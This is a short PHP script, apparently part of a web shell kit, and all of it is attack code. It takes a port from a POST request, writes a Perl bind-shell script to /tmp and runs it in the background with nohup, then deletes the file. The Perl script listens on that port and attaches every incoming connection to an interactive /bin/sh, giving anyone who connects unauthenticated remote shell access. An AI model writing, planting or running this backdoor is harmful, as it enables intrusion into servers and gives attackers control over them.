<?php
$port=$_POST['port'];
$perl_bd_scp = "
	use Socket;\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
	setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));
	listen(S,50);while(1){accept(X,S);if(!(\$pid=fork)){if(!defined \$pid){exit(0);}
	open STDIN,\"<&X\";open STDOUT,\">&X\";open STDERR,\">&X\";exec(\"/bin/sh -i\");
	close X;}}";

if(is_writable("/tmp")){
	$fp=fopen("/tmp/nst_perl_bd.pl","w");
	fwrite($fp,"$perl_bd_scp");
	passthru("nohup perl /tmp/nst_perl_bd.pl &");
	unlink("/tmp/nst_perl_bd.pl");
}

?>